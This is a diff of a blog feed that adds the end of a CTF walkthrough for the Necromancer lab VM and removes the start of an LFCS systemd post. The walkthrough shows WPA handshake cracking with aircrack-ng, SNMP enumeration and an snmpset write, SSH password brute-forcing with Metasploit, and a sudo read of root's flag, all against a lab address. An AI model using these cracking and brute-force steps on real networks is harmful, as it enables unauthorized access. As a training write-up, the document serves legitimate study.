+</pre></td><td class='code'><pre><code class=''><span class='line'>tar xjvf necromancer
+</span><span class='line'>necromancer.cap</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The file contains wireless traffic and references an SSID called community. It also captured deauthentication and association packets. If it captured a WPA handshake, we can try to crack it with aircrack-ng!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>aircrack-ng necromancer.cap -w /usr/share/wordlists/rockyou.txt 
+</span><span class='line'>Opening necromancer.cap
+</span><span class='line'>Read 2197 packets.
+</span><span class='line'>
+</span><span class='line'>   #  BSSID              ESSID                     Encryption
+</span><span class='line'>
+</span><span class='line'>   1  C4:12:F5:0D:5E:95  community                 WPA (1 handshake)
+</span><span class='line'>
+</span><span class='line'>Choosing first network as target.
+</span><span class='line'>
+</span><span class='line'>Opening necromancer.cap
+</span><span class='line'>Reading packets, please wait...
+</span><span class='line'>
+</span><span class='line'>                                 Aircrack-ng 1.2 
+</span><span class='line'>
+</span><span class='line'>      [00:00:13] 16084/9822768 keys tested (1369.50 k/s) 
+</span><span class='line'>
+</span><span class='line'>      Time left: 1 hour, 59 minutes, 23 seconds                  0.16%
+</span><span class='line'>
+</span><span class='line'>                           KEY FOUND! [ death2all ]
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>      Master Key     : 7C F8 5B 00 BC B6 AB ED B0 53 F9 94 2D 4D B7 AC 
+</span><span class='line'>                       DB FA 53 6F A9 ED D5 68 79 91 84 7B 7E 6E 0F E7 
+</span><span class='line'>
+</span><span class='line'>      Transient Key  : EB 8E 29 CE 8F 13 71 29 AF FF 04 D7 98 4C 32 3C 
+</span><span class='line'>                       56 8E 6D 41 55 DD B7 E4 3C 65 9A 18 0B BE A3 B3 
+</span><span class='line'>                       C8 9D 7F EE 13 2D 94 3C 3F B7 27 6B 06 53 EB 92 
+</span><span class='line'>                       3B 10 A5 B0 FD 1B 10 D4 24 3C B9 D6 AC 23 D5 7D 
+</span><span class='line'>
+</span><span class='line'>      EAPOL HMAC     : F6 E5 E2 12 67 F7 1D DC 08 2B 17 9C 72 42 71 8E </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Boom! It didn&rsquo;t take long at all. The key is death2all. What to do with it? The hint on the webpage mentioned u161, so we&rsquo;re looking at SNMP next. I selected <strong>snmp-check</strong> for the job of enumerating SNMP:</p>
+
+<blockquote><p>snmp-check allows you to enumerate the SNMP devices and places the output in a very
+human readable friendly format. It could  be  useful  for penetration testing or
+systems monitoring.</p></blockquote>
+
+<p>Used the cracked key as community string and got the following info:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>snmp-check -c death2all 192.168.223.128
+</span><span class='line'>snmp-check v1.9 - SNMP enumerator
+</span><span class='line'>Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)
+</span><span class='line'>
+</span><span class='line'>[+] Try to connect to 192.168.223.128:161 using SNMPv1 and community 'death2all'
+</span><span class='line'>
+</span><span class='line'>[*] System information:
+</span><span class='line'>
+</span><span class='line'>  Host IP address               : 192.168.223.128
+</span><span class='line'>  Hostname                      : Fear the Necromancer!
+</span><span class='line'>  Description                   : You stand in front of a door.
+</span><span class='line'>  Contact                       : The door is Locked. If you choose to defeat me, the door must be Unlocked.
+</span><span class='line'>  Location                      : Locked - death2allrw!
+</span><span class='line'>  Uptime snmp                   : -
+</span><span class='line'>  Uptime system                 : -
+</span><span class='line'>  System date                   : -</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now it looks that we also have a read/write community string. But still not sure where to use it, so I turned to another SNMP utility, <strong>snmpwalk</strong></p>
+
+<blockquote><p>snmpwalk  &ndash;  retrieve a subtree of management values using SNMP GETNEXT requests</p></blockquote>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>snmpwalk -v 1 -c death2allrw 192.168.223.128
+</span><span class='line'>iso.3.6.1.2.1.1.1.0 = STRING: "You stand in front of a door."
+</span><span class='line'>iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.255
+</span><span class='line'>iso.3.6.1.2.1.1.3.0 = Timeticks: (2199606) 6:06:36.06
+</span><span class='line'>iso.3.6.1.2.1.1.4.0 = STRING: "The door is Locked. If you choose to defeat me, the door must be Unlocked."
+</span><span class='line'>iso.3.6.1.2.1.1.5.0 = STRING: "Fear the Necromancer!"
+</span><span class='line'>iso.3.6.1.2.1.1.6.0 = STRING: "Locked - death2allrw!"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The output is massive, but I only kept the relevant part. The important line is this one: <code>iso.3.6.1.2.1.1.6.0 = STRING: &ldquo;Locked &ndash; death2allrw!&rdquo;</code>. So if we could change it to Unlocked, maybe something would happen? The next tool coming into play is <strong>snmpset</strong></p>
+
+<blockquote><p>snmpset  is  an  SNMP application that uses the SNMP SET request to set
+information on a network entity.  One or more object identifiers (OIDs)
+must  be given as arguments on the command line.  A type and a value to
+be set must accompany each object identifier.</p></blockquote>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>snmpset -v 1 -c death2allrw 192.168.223.128 iso.3.6.1.2.1.1.6.0 s "Unlocked"
+</span><span class='line'>iso.3.6.1.2.1.1.6.0 = STRING: "Unlocked"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We set the string for the iso.3.6.1.2.1.1.6.0 OID to Unlocked. Now let&rsquo;s walk again:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>snmpwalk -v 1 -c death2allrw 192.168.223.128
+</span><span class='line'>iso.3.6.1.2.1.1.1.0 = STRING: "You stand in front of a door."
+</span><span class='line'>iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.255
+</span><span class='line'>iso.3.6.1.2.1.1.3.0 = Timeticks: (2263758) 6:17:17.58
+</span><span class='line'>iso.3.6.1.2.1.1.4.0 = STRING: "The door is unlocked! You may now enter the Necromancer's lair!"
+</span><span class='line'>iso.3.6.1.2.1.1.5.0 = STRING: "Fear the Necromancer!"
+</span><span class='line'>iso.3.6.1.2.1.1.6.0 = STRING: "flag7{9e5494108d10bbd5f9e7ae52239546c4} - t22"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>With the door unlocked, we have the flag and next destination..SSH!</p>
+
+<p>Flag #7: <strong>demonslayer</strong></p>
+
+<h1>Flag #8 &ndash; demonslayer</h1>
+
+<p>The SSH on the machine is accepting password logins, so it&rsquo;s time for the bruteforce approach. I&rsquo;ve used the combination of demonslayer as username and rockyou.txt as wordlist.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use auxiliary/scanner/ssh/ssh_login
+</span><span class='line'>msf auxiliary(scanner/ssh/ssh_login) &gt; run
+</span><span class='line'>
+</span><span class='line'>[+] 192.168.223.128:22 - Success: 'demonslayer:12345678' 'uid=1000(demonslayer) gid=1000(demonslayer) groups=1000(demonslayer) OpenBSD thenecromancer 5.9 GENERIC#1761 amd64 '
+</span><span class='line'>[*] Command shell session 1 opened (192.168.223.129:43627 -&gt; 192.168.223.128:22) at 2018-06-09 14:41:25 -0400</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We&rsquo;ve found the password is <em>12345678</em> and have a shell on the box:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>msf auxiliary(scanner/ssh/ssh_login) &gt; sessions -i 1
+</span><span class='line'>[*] Starting interaction with 1...
+</span><span class='line'>
+</span><span class='line'>whoami
+</span><span class='line'>demonslayer
+</span><span class='line'>pwd
+</span><span class='line'>/home/demonslayer
+</span><span class='line'>ls -alh
+</span><span class='line'>total 40
+</span><span class='line'>drwxr-xr-x  3 demonslayer  demonslayer   512B Jun 23  2016 .
+</span><span class='line'>drwxr-xr-x  3 root         wheel         512B May 11  2016 ..
+</span><span class='line'>-rw-r--r--  1 demonslayer  demonslayer    87B May 11  2016 .Xdefaults
+</span><span class='line'>-rw-r--r--  1 demonslayer  demonslayer   773B May 11  2016 .cshrc
+</span><span class='line'>-rw-r--r--  1 demonslayer  demonslayer   103B May 11  2016 .cvsrc
+</span><span class='line'>-rw-r--r--  1 demonslayer  demonslayer   359B May 11  2016 .login
+</span><span class='line'>-rw-r--r--  1 demonslayer  demonslayer   175B May 11  2016 .mailrc
+</span><span class='line'>-rw-r--r--  1 demonslayer  demonslayer   218B May 11  2016 .profile
+</span><span class='line'>drwx------  2 demonslayer  demonslayer   512B May 11  2016 .ssh
+</span><span class='line'>-rw-r--r--  1 demonslayer  demonslayer   706B May 11  2016 flag8.txt</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Let&rsquo;s read that flag:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>cat flag8.txt
+</span><span class='line'>You enter the Necromancer's Lair!
+</span><span class='line'>
+</span><span class='line'>A stench of decay fills this place.  
+</span><span class='line'>
+</span><span class='line'>Jars filled with parts of creatures litter the bookshelves.
+</span><span class='line'>
+</span><span class='line'>A fire with flames of green burns coldly in the distance.
+</span><span class='line'>
+</span><span class='line'>Standing in the middle of the room with his back to you is the Necromancer.  
+</span><span class='line'>
+</span><span class='line'>In front of him lies a corpse, indistinguishable from any living creature you have seen before.
+</span><span class='line'>
+</span><span class='line'>He holds a staff in one hand, and the flickering object in the other.
+</span><span class='line'>
+</span><span class='line'>"You are a fool to follow me here!  Do you not know who I am!"
+</span><span class='line'>
+</span><span class='line'>The necromancer turns to face you.  Dark words fill the air!
+</span><span class='line'>
+</span><span class='line'>"You are damned already my friend.  Now prepare for your own death!" 
+</span><span class='line'>
+</span><span class='line'>Defend yourself!  Counter attack the Necromancer's spells at u777!</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I&rsquo;ve tried connecting to UDP 777, but nothing happened. So I tried next to connect to the local host from within the SSH shell. Netcat wasn&rsquo;t installed, but nc was:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nc -u localhost 777
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>** You only have 3 hitpoints left! **
+</span><span class='line'>
+</span><span class='line'>Defend yourself from the Necromancer's Spells!
+</span><span class='line'>
+</span><span class='line'>Where do the Black Robes practice magic of the Greater Path?  </span></code></pre></td></tr></table></div></figure>
+
+
+<p>The battle is on! Seems we have to answer correctly, so I googled and found this on <a href="https://en.wikipedia.org/wiki/Tsurani">this Wikipedia page</a>:</p>
+
+<blockquote><p>Great Ones, or Black Robes, are magicians on Kelewan who practice magic of the Greater
+Path.</p></blockquote>
+
+<p>Passing Kelewan as the answer reveals the 8th flag, which is the same as the answer:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Where do the Black Robes practice magic of the Greater Path?  Kelewan
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>flag8{55a6af2ca3fee9f2fef81d20743bda2c}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Flag #8: <strong>Kelewan</strong></p>
+
+<h1>Flag #9 &ndash; Lord of the 8th plane of hell</h1>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>** You only have 3 hitpoints left! **
+</span><span class='line'>
+</span><span class='line'>Defend yourself from the Necromancer's Spells!
+</span><span class='line'>
+</span><span class='line'>Who did Johann Faust VIII make a deal with?  </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Next quesch! I&rsquo;m proud to say I didn&rsquo;t need to google for this one :D</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Who did Johann Faust VIII make a deal with?  Mephistopheles
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>flag9{713587e17e796209d1df4c9c2c2d2966}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The legend of Faust is well-known to me, and since you&rsquo;re reading this, I have to point you to 2 epic albums of Kamelot that are inspired by Faust: Epica and The Black Halo. You will thank me later.</p>
+
+<p>Mephistopheles is also the demonlord of the 8th plane of hell in Neverwinter Nights: Hordes of the Underdark. Clearly I&rsquo;m having a nostalgic moment here!</p>
+
+<p>Flag #9: <strong>Mephistopheles</strong></p>
+
+<h1>Flag #10 &ndash; The Ninth Gate</h1>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>** You only have 3 hitpoints left! **
+</span><span class='line'>
+</span><span class='line'>Defend yourself from the Necromancer's Spells!
+</span><span class='line'>
+</span><span class='line'>Who is tricked into passing the Ninth Gate?  </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Back to Google for this one and found the answer <a href="https://en.wikipedia.org/wiki/List_of_Old_Kingdom_characters">here</a>:</p>
+
+<blockquote><p>Hedge is a necromancer in service of Orannis, who supplies Nicholas Sayre (in mistake
+for Prince Sameth) as the latter&rsquo;s avatar. He is roughly 100 years old. Motivated by an
+all-consuming desire for immortality, he believes that if he frees Orannis, he will
+become viceroy over the Dead; but fails when tricked into passing the Ninth Gate.</p></blockquote>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Who is tricked into passing the Ninth Gate?  Hedge
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>flag10{8dc6486d2c63cafcdc6efbba2be98ee4}
+</span><span class='line'>
+</span><span class='line'>A great flash of light knocks you to the ground; momentarily blinding you!
+</span><span class='line'>
+</span><span class='line'>As your sight begins to return, you can see a thick black cloud of smoke lingering where the Necromancer once stood.
+</span><span class='line'>
+</span><span class='line'>An evil laugh echoes in the room and the black cloud begins to disappear into the cracks in the floor.
+</span><span class='line'>
+</span><span class='line'>The room is silent.
+</span><span class='line'>
+</span><span class='line'>You walk over to where the Necromancer once stood.
+</span><span class='line'>
+</span><span class='line'>On the ground is a small vile.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Flag #10: <strong>Hedge</strong></p>
+
+<h1>Flag #11 &ndash; The elixir of power</h1>
+
+<p>A small vile on the ground..a hidden .smallvile file in demonslayer&rsquo;s home!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat .smallvile
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>You pick up the small vile.
+</span><span class='line'>
+</span><span class='line'>Inside of it you can see a green liquid.
+</span><span class='line'>
+</span><span class='line'>Opening the vile releases a pleasant odour into the air.
+</span><span class='line'>
+</span><span class='line'>You drink the elixir and feel a great power within your veins!</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Immediately I thought of root privileges and looked at the sudo rights:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ sudo -l
+</span><span class='line'>Matching Defaults entries for demonslayer on thenecromancer:
+</span><span class='line'>    env_keep+="FTPMODE PKG_CACHE PKG_PATH SM_PATH SSH_AUTH_SOCK"
+</span><span class='line'>
+</span><span class='line'>User demonslayer may run the following commands on thenecromancer:
+</span><span class='line'>    (ALL) NOPASSWD: /bin/cat /root/flag11.txt</span></code></pre></td></tr></table></div></figure>
+
+
+<p>User demonslayer can read the 11th flag in root&rsquo;s home folder. Let&rsquo;s see the ending:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ sudo /bin/cat /root/flag11.txt
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Suddenly you feel dizzy and fall to the ground!
+</span><span class='line'>
+</span><span class='line'>As you open your eyes you find yourself staring at a computer screen.
+</span><span class='line'>
+</span><span class='line'>Congratulations!!! You have conquered......
+</span><span class='line'>
+</span><span class='line'>          .                                                      .
+</span><span class='line'>        .n                   .                 .                  n.
+</span><span class='line'>  .   .dP                  dP                   9b                 9b.    .
+</span><span class='line'> 4    qXb         .       dX                     Xb       .        dXp     t
+</span><span class='line'>dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
+</span><span class='line'>9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
+</span><span class='line'> 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
+</span><span class='line'>  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
+</span><span class='line'>    `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
+</span><span class='line'>        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
+</span><span class='line'>                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
+</span><span class='line'>                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
+</span><span class='line'>                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
+</span><span class='line'>                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
+</span><span class='line'>                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
+</span><span class='line'>                     `'      9XXXXXX(   )XXXXXXP      `'
+</span><span class='line'>                              XXXX X.`v'.X XXXX
+</span><span class='line'>                              XP^X'`b   d'`X^XX
+</span><span class='line'>                              X. 9  `   '  P )X
+</span><span class='line'>                              `b  `       '  d'
+</span><span class='line'>                               `             '                       
+</span><span class='line'>                               THE NECROMANCER!
+</span><span class='line'>                                 by  @xerubus
+</span><span class='line'>
+</span><span class='line'>                   flag11{42c35828545b926e79a36493938ab1b1}
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Big shout out to Dook and Bull for being test bunnies.
+</span><span class='line'>
+</span><span class='line'>Cheers OJ for the obfuscation help.
+</span><span class='line'>
+</span><span class='line'>Thanks to SecTalks Brisbane and their sponsors for making these CTF challenges possible.
+</span><span class='line'>
+</span><span class='line'>"========================================="
+</span><span class='line'>"  xerubus (@xerubus) - www.mogozobo.com  "
+</span><span class='line'>"========================================="</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Flag #11: <strong>hackergod</strong></p>
+
+<p>The necromancer is down! This was a really fun one, with a lot of challenge diversity and that text-based RPG feel and fantasy mentions! Thanks to xerubus for putting us face to face with the necromancer!</p>
+
+<p>Some special fortune cookie:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'> _________________________________________
+</span><span class='line'>/ M: Last I knew, I thought I had trapped \
+</span><span class='line'>| you for all eternity in an icy little   |
+</span><span class='line'>| place called Cania                      |
+</span><span class='line'>|                                         |
+</span><span class='line'>| H: Sorry, Hell froze over.              |
+</span><span class='line'>|                                         |
+</span><span class='line'>| M: How very witty. But it takes more    |
+</span><span class='line'>| than sharp wit to rule Hell, little     |
+</span><span class='line'>\ one. You must also...dress the part.    /
+</span><span class='line'> -----------------------------------------
+</span><span class='line'>        \   ^__^
+</span><span class='line'>         \  (oo)\_______
+</span><span class='line'>            (__)\       )\/\
+</span><span class='line'>                ||----w |
+</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>
+
+
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Got a Stapler?]]></title>
@@ -11888,189 +13055,6 @@ This used to be <code>/etc/sysctl.conf</code> , and can still be used, but newer
 </span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>
 
 
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[LFCS prep - Runlevels and bootloader configuration]]></title>
-    <link href="http://chousensha.github.io/blog/2018/02/08/lfcs-prep-runlevels-and-bootloader-configuration/"/>
-    <updated>2018-02-08T12:47:30-05:00</updated>
-    <id>http://chousensha.github.io/blog/2018/02/08/lfcs-prep-runlevels-and-bootloader-configuration</id>
-    <content type="html"><![CDATA[<p>Today we&rsquo;ll look at the following LFCS objectives:</p>
-
-<ul>
-<li><p>Log into graphical and text mode consoles</p></li>
-<li><p>Boot systems into different runlevels manually</p></li>
-<li><p>Install, configure and troubleshoot the  bootloader</p></li>
-</ul>
-
-
-<!-- more -->
-
-
-<h2>systemd targets</h2>
-
-<p>First, let&rsquo;s take a look at all the available targets:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>systemctl list-units --type=target --all
-</span><span class='line'>  UNIT                   LOAD      ACTIVE   SUB    DESCRIPTION
-</span><span class='line'>  basic.target           loaded    active   active Basic System
-</span><span class='line'>  cryptsetup.target      loaded    active   active Encrypted Volumes
-</span><span class='line'>  emergency.target       loaded    inactive dead   Emergency Mode
-</span><span class='line'>  final.target           loaded    inactive dead   Final Step
-</span><span class='line'>  getty.target           loaded    active   active Login Prompts
-</span><span class='line'>  graphical.target       loaded    active   active Graphical Interface
